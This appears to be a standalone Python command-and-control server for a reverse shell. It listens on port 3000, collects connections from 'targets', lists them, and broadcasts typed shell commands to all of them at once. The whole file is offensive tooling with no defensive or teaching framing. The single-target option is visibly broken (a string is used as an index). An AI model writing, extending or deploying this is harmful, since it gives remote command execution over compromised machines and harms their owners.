#!/usr/bin/python3

import socket, sys
from threading import Thread
from queue import Queue

HOST = '0.0.0.0'
PORT = 3000
connections_list = list()
address_list = list()
NUMBER_OF_THREADS = 4

send = lambda a, b : a.send(b.encode())

def send_to(q, cmd) :
    while True :
        conn = q.get()
        conn.send(cmd.encode())
        q.task_done()
        

def senders(*args) :
    for _ in range(NUMBER_OF_THREADS) :
        Thread(target=send_to, args=args, daemon=True).start()

""" Open a TCP server socket """
def create_socket() :
    global objSocket

    try :
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error() as ex :
        print(f'Error creating Socket :{str(ex)}\n')

""" Binding SOCKET """
def bind_socket() :
    global objSocket
    while True :
        try :
            objSocket.bind((HOST, PORT))
            objSocket.listen(20)
            print(f'Socket Created on {HOST}:{PORT}\n')
            break
        except socket.error() as ex:
            print(f'error Binding Socket {ex}\n')

""" Accept incomming connections """
def accept_connections() :
    while True :
        conn, addr = objSocket.accept()
        connections_list.append(conn)
        address_list.append(addr[0])

""" Send a cmd to all connection """
def send_to_all(cmd) :
    q = Queue()
    for conn in connections_list :
        q.put(conn)

    senders(q, cmd)
    q.join()

""" Start the reverse shell """
def start_shell() :
    while True :
        options_display = '1. List all connections\n2. Shell to a specifique target\n3. Shell to all targets\nq. Quit'
        print(options_display)
        choise = input('\n>>> ')

        if choise == '1' :
            if len(address_list) >= 1 :
                print('\n*** List of connections :')
                for i, addr in enumerate(address_list) :
                    print(f'{i + 1} - {addr}')
                print('==============================\n')
            else :
                print("\nNo connections established\n")

        elif choise == '3' :
            while True :
                cmd = input("\n$ ")
                if cmd == 'q' : break
                else :
                    send_to_all(cmd)

        elif choise == '2' :
            n = input('Choise target :\n')
            if int(n) > len(connections_list) :
                print('[!] Target doesn\'t exist.')
            else : 
                target = connections_list[n - 1]
                addr = address_list[n - 1]
                print(f'Connection to {addr}')


        elif choise == 'q':
            sys.exit()

        else :
            print('\n[!] Please from options list')


if __name__ == '__main__' :
    create_socket()
    bind_socket()
    Thread(target=accept_connections, daemon=True).start()
    start_shell()
